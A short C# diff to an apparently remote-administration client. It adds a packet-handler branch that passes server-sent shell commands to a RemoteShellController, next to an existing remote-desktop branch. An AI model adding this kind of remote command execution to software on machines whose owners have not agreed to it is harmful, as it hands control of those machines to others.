@@ -1,5 +1,5 @@
 ﻿using Client.Controllers;
-using System.Windows.Forms;
+using Client.Packets.ServerPackets;
 
 namespace Client.Packets
 {
@@ -16,6 +16,10 @@ namespace Client.Packets
             else if(type == TypePackets.GetDesktop)
             {
                 RemoteDesktopController.getDesktop(client);
+            }
+            else if (type == TypePackets.GetExecuteShellCmd)
+            {
+                RemoteShellController.getExecuteShellCmd((GetExecuteShellCmd)packet, client);
             }
         }
     }
